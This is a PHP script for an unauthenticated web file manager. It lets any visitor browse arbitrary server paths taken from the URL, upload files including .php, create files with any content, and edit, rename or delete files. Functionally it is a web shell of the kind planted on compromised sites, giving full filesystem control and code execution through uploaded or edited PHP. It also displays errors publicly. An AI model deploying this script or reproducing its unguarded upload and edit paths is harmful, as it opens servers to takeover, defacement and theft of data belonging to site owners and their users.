<?php

// ============================

// 🔧 SETTINGS & SECURITY

// ============================

ini_set('display_errors', 1);

ini_set('display_startup_errors', 1);

error_reporting(E_ALL);



session_start();



// Allowed extensions for upload

$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf', 'zip', 'php', 'html', 'css', 'js', 'json', 'sql'];



// File size limit is removed, but PHP.ini settings still apply

// ============================



// ============================

// 📂 PATH SETTINGS

// ============================

$currentPath = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();



if (!$currentPath || !is_dir($currentPath)) {

    $currentPath = getcwd();

}



$item = isset($_GET['item']) ? basename($_GET['item']) : '';

$itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;



// ============================

// 📋 FUNCTIONS

// ============================



// 1. DIRECTORY LISTING

function showDirectory($dir)

{

    $entries = array_diff(scandir($dir), ['.', '..']);

    echo "<h2>📁 Directory: $dir</h2><ul>";



    foreach ($entries as $entry) {

        $fullPath = $dir . DIRECTORY_SEPARATOR . $entry;

        $isDir = is_dir($fullPath);

        $icon = $isDir ? "📂" : "📄";

        $size = !$isDir && file_exists($fullPath) ? round(filesize($fullPath) / 1024, 2) . " KB" : "";



        echo "<li style='margin-bottom: 5px;'>$icon ";



        if ($isDir) {

            echo "<a href='?path=" . urlencode($fullPath) . "'>$entry</a>";

        } else {

            echo "<b>$entry</b> <small>($size)</small> 

                [<a href='?path=" . urlencode($dir) . "&action=edit&item=" . urlencode($entry) . "'>Edit</a>] 

                [<a href='?path=" . urlencode($dir) . "&action=delete&item=" . urlencode($entry) . "' onclick=\"return confirm('Are you sure you want to delete this item?')\">Delete</a>] 

                [<a href='?path=" . urlencode($dir) . "&action=rename&item=" . urlencode($entry) . "'>Rename</a>]";

        }



        echo "</li>";

    }



    echo "</ul>";

}



// 2. FILE UPLOAD

function uploadFile($dir)

{

    global $allowed_extensions;



    if (!empty($_FILES['file']['name'])) {

        $fileName = basename($_FILES['file']['name']);

        $target = $dir . DIRECTORY_SEPARATOR . $fileName;

        $fileType = strtolower(pathinfo($target, PATHINFO_EXTENSION));



        // Extension Check

        if (!in_array($fileType, $allowed_extensions)) {

            echo "<p style='color:red;'>❌ Error: File extension not allowed ($fileType).</p>";

        } else {

            // Upload Process

            if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {

                echo "<p style='color:green;'>✅ File uploaded successfully: $fileName</p>";

            } else {

                echo "<p style='color:red;'>❌ Upload failed. Check directory write permissions (chmod).</p>";

            }

        }

    }

}



// 3. CREATE FOLDER

function makeFolder($dir)

{

    $folder = trim($_POST['folder_name']);

    if (!$folder) return;



    $folderPath = $dir . DIRECTORY_SEPARATOR . $folder;

    if (!file_exists($folderPath)) {

        if (mkdir($folderPath)) {

            echo "<p style='color:green;'>📁 Folder created: $folder</p>";

        } else {

            echo "<p style='color:red;'>❌ Failed to create folder (Permission error).</p>";

        }

    } else {

        echo "<p style='color:red;'>⚠️ Folder already exists.</p>";

    }

}



// 4. CREATE FILE AND WRITE CONTENT

function makeFile($dir)

{

    $file = trim($_POST['file_name']);

    $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';



    if (!$file) return;



    $filePath = $dir . DIRECTORY_SEPARATOR . $file;

    

    if (!file_exists($filePath)) {

        if (file_put_contents($filePath, $content) !== false) {

            echo "<p style='color:green;'>📄 File created and content written: $file</p>";

        } else {

            echo "<p style='color:red;'>❌ Failed to write file. Check permissions.</p>";

        }

    } else {

        echo "<p style='color:red;'>⚠️ File already exists. Content was not overwritten.</p>";

    }

}



// 5. EDIT FILE

function editFile($path)

{

    if (!file_exists($path)) {

        echo "<p style='color:red;'>❌ File not found.</p>";

        return;

    }



    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {

        file_put_contents($path, $_POST['content']);

        echo "<p style='color:green;'>✅ Saved successfully!</p>";

    }



    $content = htmlspecialchars(file_get_contents($path));

    echo "<h3>📝 Editing: " . basename($path) . "</h3>

          <form method='POST'>

            <textarea name='content' style='width:100%; height:400px; font-family:monospace;'>$content</textarea><br><br>

            <button type='submit' style='padding:10px 20px; background:green; color:white; border:none; cursor:pointer;'>Save</button>

            <a href='?path=" . urlencode(dirname($path)) . "' style='margin-left:10px;'>Cancel</a>

          </form>";

}



// 6. DELETE AND RENAME

function removeFile($path)

{

    if (file_exists($path)) {

        if (is_dir($path)) {

             if (rmdir($path)) echo "<p style='color:green;'>🗑️ Folder deleted.</p>";

             else echo "<p style='color:red;'>❌ Folder could not be deleted (Might not be empty).</p>";

        } else {

             unlink($path);

             echo "<p style='color:green;'>🗑️ File deleted.</p>";

        }

    } else {

        echo "<p style='color:red;'>❌ Item not found.</p>";

    }

}



function renameItem($path)

{

    if (!file_exists($path)) {

        echo "<p style='color:red;'>❌ Item not found.</p>";

        return;

    }



    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['new_name'])) {

        $newPath = dirname($path) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);

        if (rename($path, $newPath)) {

            echo "<p style='color:green;'>✅ Renamed successfully!</p>";

            echo "<script>window.location.href='?path=" . urlencode(dirname($path)) . "';</script>";

        } else {

            echo "<p style='color:red;'>❌ Rename failed.</p>";

        }

    } else {

        echo "<h3>✏️ Rename: " . basename($path) . "</h3>

              <form method='POST'>

                <input type='text' name='new_name' value='" . basename($path) . "' required style='padding:5px; width:300px;'>

                <button type='submit' style='padding:5px 10px;'>Rename</button>

              </form>";

    }

}



// ============================

// ⚙️ ACTION HANDLER

// ============================



// Handle POST Requests

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_FILES['file'])) uploadFile($currentPath);

    if (isset($_POST['folder_name'])) makeFolder($currentPath);

    if (isset($_POST['file_name'])) makeFile($currentPath);

}



// Handle Specific Actions (Edit, Delete, Rename)

$actionView = false;

if (isset($_GET['action']) && $item) {

    $actionView = true;

    // Go Up link for actions

    echo "<a href='?path=" . urlencode($currentPath) . "'>⬅️ Go Back</a><hr>";

    switch ($_GET['action']) {

        case 'edit': editFile($itemPath); break;

        case 'delete': removeFile($itemPath); break;

        case 'rename': renameItem($itemPath); break;

    }

}



// Directory Listing and Forms

if (!$actionView) {

    // Go Up link at the top

    echo "<div style='background:#f4f4f4; padding:10px; border-bottom:1px solid #ccc;'>

            <b>Current Location:</b> " . htmlspecialchars($currentPath) . " 

            <a href='?path=" . urlencode(dirname($currentPath)) . "'>[⬅️ Go Up]</a>

          </div>";

    

    showDirectory($currentPath);



    echo "<hr>";

    

    // Go Up link at the bottom (as requested)

    echo "<div style='background:#f4f4f4; padding:10px; border-top:1px solid #ccc; margin-bottom: 20px;'>

            <a href='?path=" . urlencode(dirname($currentPath)) . "'>[⬅️ Go Up]</a>

          </div>";



    // FORM AREAS

    echo "<div style='display:flex; justify-content:space-between; flex-wrap:wrap;'>";



    // 1. Upload Form

    echo "<div style='border:1px solid #ddd; padding:10px; margin:5px; flex:1; min-width:300px;'>

            <h3>⬆️ Upload File</h3>

            <form method='POST' enctype='multipart/form-data'>

                <input type='file' name='file' required><br><br>

                <small>Allowed extensions: " . implode(', ', $allowed_extensions) . "<br><b>No size limit.</b></small><br><br>

                <button type='submit'>Upload</button>

            </form>

          </div>";



    // 2. Create Folder Form

    echo "<div style='border:1px solid #ddd; padding:10px; margin:5px; flex:1; min-width:300px;'>

            <h3>📁 Create Folder</h3>

            <form method='POST'>

                <input type='text' name='folder_name' placeholder='Folder name' required style='width:100%'><br><br>

                <button type='submit'>Create</button>

            </form>

          </div>";



    // 3. Create File Form

    echo "<div style='border:1px solid #ddd; padding:10px; margin:5px; flex:1; min-width:300px;'>

            <h3>✍️ Create & Write File</h3>

            <form method='POST'>

                <input type='text' name='file_name' placeholder='File name (e.g., test.txt)' required style='width:100%'><br><br>

                <textarea name='file_content' placeholder='File content...' style='width:100%; height:60px;'></textarea><br><br>

                <button type='submit'>Create & Write</button>

            </form>

          </div>";



    echo "</div>"; // Flex container end

}

?>